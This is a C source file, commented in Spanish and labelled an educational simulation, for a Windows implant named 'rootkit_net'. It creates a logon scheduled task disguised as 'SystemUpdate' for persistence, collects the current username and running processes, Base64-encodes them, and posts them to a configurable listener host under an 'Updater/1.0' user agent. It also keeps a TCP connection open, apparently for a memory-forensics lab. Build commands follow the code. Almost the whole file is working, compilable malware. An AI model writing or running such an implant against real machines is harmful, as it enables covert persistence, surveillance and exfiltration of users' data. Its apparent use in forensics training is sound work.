// rootkit_net.c  (simulación educativa)
// Compilar con MinGW x64: -lwinhttp -lcrypt32 -ladvapi32 -lws2_32
// Funciones:
// 1) Persistencia: schtasks /create (OnLogon)
// 2) Recolección: usuario + lista de procesos
// 3) Base64 opcional del payload
// 4) Exfiltración HTTP POST al host (WSL/Listener)
// 5) Conexión TCP viva ~60s (para que netscan lo vea)

#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Lmcons.h>
#include <wincrypt.h>


#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ws2_32.lib")

// === Ajusta estos valores a tu entorno ===
#define SERVER_HOST   "x.x.x.x"   // IP del HOST en la red Host-Only
#define SERVER_PORT   8080             // Puerto del listener (Python/Burp)
#define SERVER_PATH   L"/"             // Path del POST

// Activa para codificar en Base64 el cuerpo del POST
#define USE_BASE64    1

// Mantener un socket TCP abierto para netscan (~60s)
#define KEEP_SOCKET_OPEN 1
#define SOCKET_KEEP_SECS 60

static void sleep_ms(DWORD ms) { Sleep(ms); }

static void create_persistence_task(void) {
    // Ruta donde suele estar el binario en la demo (ajusta si quieres)
    char exePath[MAX_PATH] = "C:\\Users\\Public\\rootkit_net.exe";

    // Construye el comando schtasks (tarea por usuario en OnLogon)
    // Nota: para no requerir admin, se crea con /sc onlogon y /rl limited
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"SystemUpdate\" /tr \"%s\" /sc onlogon /rl limited /f",
        exePath);

    // Ejecuta y no muestra ventana
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        (LPSTR)"/c schtasks /query >NUL 2>&1", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    system(cmd); // simple y suficiente para la demo
}

static char* collect_user_and_processes(void) {
    // Usuario
    char user[UNLEN + 1];
    DWORD userLen = UNLEN + 1;
    if (!GetUserNameA(user, &userLen)) {
        strcpy(user, "unknown");
    }

    // Lista de procesos
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    char* big = (char*)malloc(64 * 1024);
    if (!big) return NULL;
    big[0] = 0;

    strcat(big, "{ \"user\": \"");
    strcat(big, user);
    strcat(big, "\", \"processes\": [");

    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { 0 };
        pe.dwSize = sizeof(pe);
        BOOL first = TRUE;
        if (Process32First(hSnap, &pe)) {
            do {
                if (!first) strcat(big, ", ");
                first = FALSE;

                char line[512];
                snprintf(line, sizeof(line), "{\"pid\": %lu, \"name\": \"%.260ls\"}", pe.th32ProcessID, pe.szExeFile);
                strcat(big, line);
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    strcat(big, "] }");
    return big;
}

static char* to_base64(const BYTE* data, DWORD len) {
    DWORD outLen = 0;
    if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen))
        return NULL;
    char* out = (char*)malloc(outLen + 1);
    if (!out) return NULL;
    if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &outLen)) {
        free(out);
        return NULL;
    }
    out[outLen] = 0;
    return out;
}

static BOOL http_post_winhttp(const wchar_t* hostW, INTERNET_PORT port, const wchar_t* pathW, const char* body) {
    BOOL ok = FALSE;
    HINTERNET hSession = WinHttpOpen(L"Updater/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, hostW, port, 0);
    if (hConnect) {
        HINTERNET hReq = WinHttpOpenRequest(hConnect, L"POST", pathW, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (hReq) {
            wchar_t hdrs[] = L"Content-Type: application/json";
            DWORD bodyLen = (DWORD)strlen(body);

            if (WinHttpSendRequest(hReq, hdrs, (DWORD)-1L, (LPVOID)body, bodyLen, bodyLen, 0) &&
                WinHttpReceiveResponse(hReq, NULL)) {
                ok = TRUE;
            }
            WinHttpCloseHandle(hReq);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    return ok;
}

static void keep_tcp_socket_alive(const char* host, unsigned short port, int seconds) {
#if KEEP_SOCKET_OPEN
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return; }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        // Mantenerlo abierto para que netscan lo vea
        for (int i = 0; i < seconds; ++i) {
            sleep_ms(1000);
        }
    }
    closesocket(s);
    WSACleanup();
#endif
}

int main(void) {
    // (Opcional) Ocultar ventana en ejecución real; en demo lo dejamos visible
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 1) Persistencia
    create_persistence_task();

    // 2) Recolección
    char* json = collect_user_and_processes();
    if (!json) return 1;

    // 3) Base64 opcional
    char* payload = NULL;
#if USE_BASE64
    payload = to_base64((const BYTE*)json, (DWORD)strlen(json));
#else
    payload = _strdup(json);
#endif

    // 4) Envío HTTP POST
    wchar_t hostW[256]; mbstowcs(hostW, SERVER_HOST, 256);
    BOOL sent = http_post_winhttp(hostW, SERVER_PORT, SERVER_PATH, payload ? payload : "");

    // 5) Mantener socket TCP vivo para netscan (~60s)
    keep_tcp_socket_alive(SERVER_HOST, SERVER_PORT, SOCKET_KEEP_SECS);

    // Limpieza
    if (payload) free(payload);
    if (json) free(json);

    return sent ? 0 : 2;
}

// MinGW-w64 (x86_64):
//#x86_64-w64-mingw32-gcc rootkit_net.c -o rootkit_net.exe -lwinhttp -lcrypt32 -ladvapi32 -lws2_32

//MSYS2/MinGW
//gcc rootkit_net.c -O2 -s -o rootkit_net.exe -lwinhttp -lcrypt32 -ladvapi32 -lws2_32
